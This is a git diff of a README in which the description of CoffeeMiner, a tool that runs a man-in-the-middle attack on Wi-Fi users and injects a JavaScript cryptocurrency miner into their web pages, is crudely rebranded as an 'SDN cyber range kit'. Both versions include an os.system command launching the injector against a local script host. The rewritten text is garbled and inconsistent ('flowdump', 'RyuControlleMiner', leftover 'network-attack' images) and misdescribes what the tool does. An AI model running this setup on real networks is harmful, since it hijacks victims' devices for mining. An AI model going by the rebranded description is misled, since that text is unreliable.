@@ -1,18 +1,18 @@
-# CoffeeMiner
+# SDNcybeRangeKit
 
-Collaborative (mitm) cryptocurrency mining pool in wifi networks
+A penetration testing and digital forensics environment 
 
-**Warning: this project is for academic/research purposes only.**
+**Warning: this [PRIVATE] project is for academic/research purposes only.**
 
-A blog post about this project can be read here: http://arnaucode.com/blog/coffeeminer-hacking-wifi-cryptocurrency-miner.html
+A blog post about this project can be read here: http://www.ivanletteri.it/SDNcrKit
 
-![coffeeMiner](https://raw.githubusercontent.com/arnaucode/coffeeMiner/master/coffeeMiner-logo-small.png "coffeeMiner")
+![SDNcyberRangeKit](https://www.ivanletteri.it/SDNcrKit/master/sdncrkit-logo-small.png "SDNcybeRangeKit")
 
 ## Concept
-- Performs a MITM attack to all selected victims
-- Injects a js script in all the HTML pages requested by the victims
-- The js script injected contains a cryptocurrency miner
-- All the devices victims connected to the Lan network, will be mining for the CoffeeMiner
+- Performs a SDN scenario attacks to all selected victims
+- Injects SDN rules 
+- Tapping the network
+- All the devices victims connected to the Lan network, will be monitored for the SDNcybeRangeMonitor
 
 
 ## Use
@@ -20,21 +20,21 @@ A blog post about this project can be read here: http://arnaucode.com/blog/coffe
 ```
 bash install.sh
 ```
-- edit victims.txt with one IP per line
-- edit coffeeMiner.py, line 28, with the coffeeMiner httpserver IP:
+- edit hosts.txt with one IP per line
+- edit controller.py, line 30, with the RyuControlleMiner httpserver IP:
 ```py
-os.system("~/.local/bin/mitmdump -s 'injector.py http://10.0.2.20:8000/script.js' -T")
+os.system("~/.local/bin/flowdump -s 'dump.py http://10.0.2.20:5600/script.js' -T")
 ```
-- execute coffeeMiner.py
+- execute sdn-cyberange-kit.py
 ```
-python3 coffeeMiner.py ipgateway
+python3 sdn-cyberange-kit.py ipgateway
 ```
 
-![network](https://raw.githubusercontent.com/arnaucode/coffeeMiner/master/coffeeMiner-network-attack.png "network")
+![network](https://www.ivanletteri.it/SDNcrKit/master/SDNcybeRangeKit-network-attack.png "network")
 
 
-A complete instructions for academic scenario can be found in https://github.com/arnaucode/coffeeMiner/blob/master/virtualbox_scenario_instructions.md
+A complete instructions for academic scenario can be found in https://github.com/IvanLetteri/SDNcybeRangeKit/blob/master/virtualbox_scenario_instructions.md
 
 
 
-![demo](https://raw.githubusercontent.com/arnaucode/coffeeMiner/master/coffeeMiner-demo-cutted.gif "demo")
+![demo](https://www.ivanletteri.it/SDNcrKit/master/SDNcybeRangeKit-demo-cutted.gif "demo")
